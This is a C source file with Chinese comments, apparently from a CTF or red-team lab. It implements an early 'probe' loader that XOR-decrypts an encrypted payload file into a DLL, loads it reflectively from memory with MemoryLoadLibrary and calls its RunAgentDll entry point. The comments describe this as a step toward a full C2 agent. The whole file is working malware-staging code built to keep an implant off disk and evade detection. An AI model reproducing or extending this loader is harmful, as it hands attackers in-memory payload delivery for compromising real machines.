#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "MemoryModule.h"

// 文件作用：direct_https DLL probe 的加密 bin 内存加载器。
// 它读取 direct_https_agent_sleep.x64.bin，XOR 解密成 DLL 原始字节，
// 用 MemoryLoadLibrary 从内存中加载 DLL，然后调用导出的 RunAgentDll()。
//
// 这一步不是完整 C2 上线，只是把“direct_https 代码 DLL 化 + 内存加载 + 调用入口”
// 这个链路先跑通，避免一开始就把问题混在网络通信、profile、C2 回连里。

typedef DWORD (WINAPI *RunAgentDllFn)(void);

#ifndef LOADER_BUILD_TAG
#define LOADER_BUILD_TAG "default"
#endif

// read_file：把 direct_https_agent_sleep.x64.bin 完整读入内存。
// 这是早期 probe loader，用来先验证“direct_https DLL 能被内存加载并进入入口函数”。
static int read_file(const char* path, unsigned char** outBuf, size_t* outSize)
{
    FILE* f = fopen(path, "rb");
    long size = 0;
    unsigned char* buf = NULL;

    if (!f) return 1;
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return 2; }
    size = ftell(f);
    if (size <= 0) { fclose(f); return 3; }
    rewind(f);

    buf = (unsigned char*)malloc((size_t)size);
    if (!buf) { fclose(f); return 4; }
    if (fread(buf, 1, (size_t)size, f) != (size_t)size) {
        free(buf); fclose(f); return 5;
    }
    fclose(f);
    *outBuf = buf;
    *outSize = (size_t)size;
    return 0;
}

// xor_crypt：用固定 key 还原 direct_https DLL 字节。
// pack_xor.py 生成 bin 时做了一次 XOR，这里再做一次恢复原始 PE/DLL。
static void xor_crypt(unsigned char* buf, size_t size, const char* key)
{
    size_t keyLen = strlen(key);
    if (!keyLen) return;
    for (size_t i = 0; i < size; i++) {
        buf[i] ^= (unsigned char)key[i % keyLen];
    }
}

// main：早期带控制台输出的 direct_https DLL loader。
// 它会打印每个阶段，适合调试；但后续真实测试中更常用 quiet/mmpp_lite loader。
int main(int argc, char** argv)
{
    const char* binPath = argc > 1 ? argv[1] : "direct_https_agent_sleep.x64.bin";
    const char* key = argc > 2 ? argv[2] : "ctf-memory-loader-key-20260624";
    unsigned char* payload = NULL;
    size_t payloadSize = 0;

    printf("LOADER=direct-https-agentdll-encrypted-xor\n");
    printf("LOADER_BUILD_TAG=%s\n", LOADER_BUILD_TAG);
    printf("BIN_PATH=%s\n", binPath);

    int rc = read_file(binPath, &payload, &payloadSize);
    if (rc != 0) {
        printf("READ_BIN=ERROR:%d\n", rc);
        return 10 + rc;
    }
    printf("READ_BIN=OK size=%lu\n", (unsigned long)payloadSize);

    xor_crypt(payload, payloadSize, key);
    if (payloadSize < 2 || payload[0] != 'M' || payload[1] != 'Z') {
        printf("DECRYPT_MAGIC=ERROR first=%02x%02x\n", payloadSize > 0 ? payload[0] : 0, payloadSize > 1 ? payload[1] : 0);
        free(payload);
        return 20;
    }
    printf("DECRYPT_MAGIC=OK MZ\n");

    HMEMORYMODULE module = MemoryLoadLibrary(payload, payloadSize);
    if (!module) {
        printf("MEMORY_LOAD=ERROR\n");
        free(payload);
        return 30;
    }
    printf("MEMORY_LOAD=OK\n");

    RunAgentDllFn runAgent = (RunAgentDllFn)MemoryGetProcAddress(module, "RunAgentDll");
    printf("GETPROC_RunAgentDll=%s\n", runAgent ? "OK" : "ERROR");
    if (!runAgent) {
        MemoryFreeLibrary(module);
        free(payload);
        return 40;
    }

    // RunAgentDll() 对完整 agent 来说通常是长期运行的循环。
    // 先 flush，保证重定向 stdout 时，前面的加载证据能及时落盘。
    fflush(stdout);
    DWORD agentRc = runAgent();
    printf("RUN_AGENT_RC=%lu\n", (unsigned long)agentRc);

    MemoryFreeLibrary(module);
    free(payload);
    printf("DONE=1\n");
    return agentRc == 2054 ? 0 : 50;
}
